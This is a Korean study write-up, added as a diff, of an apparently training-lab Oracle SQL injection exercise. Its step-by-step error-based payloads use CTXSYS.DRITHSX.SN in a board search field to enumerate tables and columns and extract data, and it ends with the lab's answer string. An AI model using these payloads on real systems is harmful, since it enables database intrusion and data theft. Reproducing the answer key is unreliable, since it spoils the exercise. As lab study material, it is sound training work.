@@ -1,0 +1,71 @@
+https://alwaysbeen.tistory.com/63 참고
+
+에러베이스 인젝션
+
+정보획득을 위한 저장프로시저
+UTL_INADDR.GET_HOST_NAME((서브쿼리))
+UTL_INADDR.GET_HOST_ADDRESS((서브쿼리)) => [ver > 11g, SYS 권한 필요]
+ORDSYS.ORD_DICOM.GETMAPPINGXPATH((서브쿼리), user, user)
+CTXSYS.DRITHSX.SN(user, (서브쿼리))
+출처: https://alwaysbeen.tistory.com/63 [:티스토리]
+
+================================
+* SQL Injection 문제 6번 Oracle
+================================
+
+1. 공격 과정
+1. 쿼리문 유추
+- 게시판 검색 기능을 살펴보면 전체, 제목, 내용, 제목+내용 등 여러 기준으로 게시물 검색 가능
+- select 컬럼1, 컬럼2... from 게시판
+where 제목 like '%__검색어__%'
+or 내용 like '%__검색어__%' or 글쓴이 like '%__검색어__%'.....
+- select 컬럼1, 컬럼2,... from 게시판 where 제목 like '%   %'......
+
+2. 공격 포인트
+- 제목 기준 '졸리'를 입력해서 공격 시도
+- 졸리%' and (공격 구문) and 'j%'='j
+- 블로그 참고하여 CTXSYS.DRITHSX.SN(user, (서브쿼리)) 사용하여 공격
+검색어 : 졸리%' and CTXSYS.DRITHSX.SN(user, (__공격쿼리__))=1 and 'j%'='j
+예시) 졸리%' and CTXSYS.DRITHSX.SN(user, 'hacker')=1 and 'j%'='j -> 입력 시 에러 페이지 발생하며 DRG-11701: thesaurus hacker 부분에 'hacker'가
+출력되는 것 확인
+
+3. 테이블 확인
+- 테이블 명 확인 : select table_name from user_tables
+- 테이블 개수 확인 : select count(table_name) from user_tables
+검색어 : 졸리%' and CTXSYS.DRITHSX.SN(user, (select count(table_name) from user_tables))=1 and 'j%'='j
+-> DRG-11701: thesaurus 6 테이블은 6개
+- 테이블 1 row씩 : select table_name from (select table_name, rownum as ln from user_tables)
+검색어 : 졸리%' and CTXSYS.DRITHSX.SN(user, (select table_name from (select table_name, rownum as ln from user_tables) where ln=1))=1 and 'j%'='j
+-> DRG-11701: thesaurus BOARD 출력(1번째 테이블은 BOARD)
+- 반복 결과 5번 테이블이 EQST_ANSWER로 확인
+
+4. EQST_ANSWER 테이블의 컬럼
+- select column_name from cols where table_name = 'EQST_ANSWER'
+- 컬럼의 개수 : 졸리%' and CTXSYS.DRITHSX.SN(user, (select count(column_name) from cols where table_name = 'EQST_ANSWER'))=1 and 'j%'='j -> 5개
+
+SELECT COUNT(*) 
+FROM USER_TAB_COLUMNS 
+WHERE TABLE_NAME = 'EQST_ANSWER';
+
+졸리%' and CTXSYS.DRITHSX.SN(user, (select count(*) from user_tab_columns where table_name = 'EQST_ANSWER'))=1 and 'j%'='j
+-> 입력을 통해 총 5개의 컬럼 보유중인 것 확인
+
+- 컬럼 1 row 씩 : select column_name from (select column_name, rownum as ln from cols where table_name = 'EQST_ANSWER') where ln = 1
+검색어 : 졸리%' and CTXSYS.DRITHSX.SN(user, (select column_name from (select column_name, rownum as ln from cols where table_name = 'EQST_ANSWER') where ln = 1))=1 and 'j%'='j
+결과로는 DRG-11701: thesaurus ANSWER_COLUMN 확인됨 -> 1번 컬럼
+
+intruder를 통해 5개의 컬럼 조회
+컬럼 1 : ANSWER_COLUMN
+컬럼 2 : REG_DT
+컬럼 3 : REG_ACCT_ID
+컬럼 4 : UDT_DT
+컬럼 5 : UDT_ACCT_ID
+-> 컬럼 1 이 정답 데이터가 있는 컬럼
+
+5. 데이터 추출
+- 졸리%' and CTXSYS.DRITHSX.SN(user, (select answer_column from (select answer_column, rownum as ln from eqst_answer) where ln = 1))=1 and 'j%'='j
+DRG-11701: thesaurus skinfosec_eqst_lms_system 출력 확인
+
+2. 정답
+skinfosec_eqst_lms_system
+================================
